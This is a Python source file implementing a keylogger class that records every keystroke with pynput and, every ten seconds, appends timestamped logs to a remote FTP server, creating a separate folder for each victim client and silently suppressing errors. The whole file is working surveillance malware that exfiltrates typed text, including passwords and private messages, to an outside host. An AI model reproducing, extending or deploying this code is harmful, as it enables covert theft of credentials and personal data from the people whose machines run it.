import pynput.keyboard
import threading
from time import gmtime, strftime
import ftplib
import io



class Keylogger:

    def __init__(self):
        self.log = ""
        self.keyboard_listener = pynput.keyboard.Listener()


    #append logged characters to log variable
    def append_string(self, string):
        self.log = self.log + string


    #log keystrokes
    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_string(current_key)


    #checks if client folder and file exist
    def client_folder_exist(self, ftp, filename, folderId, client_id):
        try:
            if folderId in ftp.nlst():
                ftp.cwd(folderId)

            else:
                ftp.mkd(folderId)
                ftp.cwd(folderId)

            if client_id in ftp.nlst():
                ftp.cwd(client_id)

            else:
                ftp.mkd(client_id)
                ftp.cwd(client_id)

            if filename in ftp.nlst():
                pass

            else:
                ftp.storbinary('STOR log.txt', " ")

        except Exception as e:
            pass
            #print(e)



    def writeToTxt(self, ftp, filename):
        try:
            if self.log == "":
                pass
            else:
                logdata = strftime("%Y-%m-%d %H:%M:%S", gmtime()) + ": " + self.log + "\n"
                self.log = ""
                #print(logdata)

                logdata = io.BytesIO(logdata.encode('utf-8'))
                ftp.storbinary(f"APPE {filename}", logdata)

            timer = threading.Timer(10, self.writeToTxt, [ftp, filename])
            timer.start()
        except:
            pass


    #starts keylogger
    def start_keylogger(self, FTP_PASS, filename, folderId, client_id, FTP_HOST, FTP_USER):

        ftp = ftplib.FTP(FTP_HOST, FTP_USER, FTP_PASS)
        ftp.encoding = "utf-8"
        self.client_folder_exist(ftp, filename, folderId, client_id)
        self.keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)

        with self.keyboard_listener:
            self.writeToTxt(ftp, filename)
            self.keyboard_listener.join()


    #stop keylogger timer
    def stop_timer(self):
        self.keyboard_listener.stop()
        self.keyboard_listener.join()



